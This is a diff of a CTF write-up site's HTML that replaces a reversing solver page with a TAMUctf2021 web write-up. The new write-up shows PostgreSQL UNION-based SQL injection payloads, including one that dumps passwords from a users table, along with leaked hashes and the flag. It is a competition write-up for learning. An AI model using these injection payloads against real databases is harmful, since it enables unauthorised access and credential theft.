@@ -6,16 +6,16 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/reversing/ShaktiCTF/Margaret/">
-        <link rel="shortcut icon" href="../../../img/favicon.ico">
-        <title>Margaret - CTF-Writeups</title>
-        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
-        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/web/TAMUctf2021/API2%3ATHE%20SEQUEL/THeSequel/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>THeSequel - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
 
-        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../../js/bootstrap.min.js" defer></script>
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -23,7 +23,7 @@
     <body>
         <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
             <div class="container">
-                <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
                 <!-- Expander button -->
                 <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
                     <span class="navbar-toggler-icon"></span>
@@ -34,10 +34,10 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li class="navitem">
-                                <a href="../../../about/" class="nav-link">About Us</a>
+                                <a href="../../../../about/" class="nav-link">About Us</a>
                             </li>
                             <li class="navitem">
-                                <a href="../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                                <a href="../../../../shaktictf/" class="nav-link">ShaktiCTF</a>
                             </li>
                             <li class="navitem">
                                 <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
@@ -51,7 +51,7 @@
                             </a>
                         </li>
                             <li class="nav-item">
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/reversing/ShaktiCTF/Margaret.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/web/TAMUctf2021/API2:THE SEQUEL/THeSequel.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -70,62 +70,20 @@
     
     <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
         <ul class="nav flex-column">
-            
-            
-            
-            
         </ul>
     </div>
 </div></div>
                     <div class="col-md-9" role="main">
 
-<h3 id="author">Author</h3>
-<p>Simran Sandra</p>
-<h3 id="challenge-short-writeup">Challenge Short Writeup</h3>
-<p>The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver. </p>
-<h3 id="solver">Solver</h3>
-<pre><code class="language-python">result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93]
-opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8]
-import math
-def xor(argument):
-  return argument^0x30
-def mult(argument):
-  return math.ceil(argument/1024)
-def mul(argument):
-  return math.ceil(argument/0x20)
-def division(argument):
-  return math.ceil(argument-0x32)
-def add(argument):
-  return argument-0x50
-def sub(argument):
-    return argument+0x9
-def div(argument):
-    return argument
-def andd(argument):
-    return argument^0x20
-def default(argument):
-  return &quot;Incorrect case&quot;
-switcher = {
-    1: xor,
-    2: mult,
-    3: mul,
-    4: division,
-    5: add,
-    6: sub,
-    7: div,
-    8: andd
-}
-def switch(operation, num1):
-  return switcher.get(operation, default)(num1)
-flag=[]
-for i in range(80):
-    flag.append(switch(opcode[i], result[i]))
-flag=[chr(int(k)) for k in flag]
-print(flag)
-
-</code></pre>
-<h3 id="flag">Flag</h3>
-<p><code>shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}</code></p></div>
+<p>This challenge was related to simple  PostgreSQL. injection
+The VERSION() function returns the current version of the MySQL database, as a string which let's us know it's postgresql</p>
+<p>"https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)"</p>
+<p>we get the respective output from this.</p>
+<p>invalid input syntax for type numeric: " 1 Default safe default testing icon avatar 2 Teddy euclid To please the teddy, one must offer them a sacrifice of your finest tea teddy 3 Traffic Cone #88192 neutralized We believe they appear from interdimensional rifts with no clear origin cone 4 Gnomial thaumiel If encountered in the wild do not make eye contact. They only become more aggressive. gnome 5 Ǎ̷̓d̴͗͒d̸͛͛i̷͋̃ṡ̵̍ơ̸̒ṅ̶̌ apollyon H̵̔̂Ė̵̈ ̴̛̽I̵͛͘S̷͒̇ ̷̈́̒Ȁ̷͚L̴̀̿R̴̾̌E̷͆̚Ā̶̛D̷̒̐Y̶͗͌ ̷̏̔H̶̿̚Ẽ̶̄R̷̈́͝E̸̊̈́ crump 1 glenn 9651cbc7c0b5fb1a81f2858a07813c82 Making More Challenges 2 teddy e2ec2b31abe380b989ff057aef66377a PWNing Away 3 admin gigem{SQL_1nj3ct1ons_c4n_b3_fun} Away on Vacation "</p>
+<p>as we can see the user name is thaumiel and hence we include it in our payload
+payload="Cone%27+Union+select+1,password,%27thaumiel%27,%27d%27,%27a%27+from+users--"</p>
+<p>it allows to execute a fully formatted subquery within the injected part, which technically has almost the same impact as interacting with a pure PostgreSQL database. </p>
+<p>gigem{SQL_1nj3ct1ons_c4n_b3_fun}</p></div>
             </div>
         </div>
 
@@ -135,12 +93,12 @@ print(flag)
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "../../..",
+            var base_url = "../../../..",
                 shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
         </script>
-        <script src="../../../js/base.js" defer></script>
+        <script src="../../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
-        <script src="../../../search/main.js" defer></script>
+        <script src="../../../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-lg">
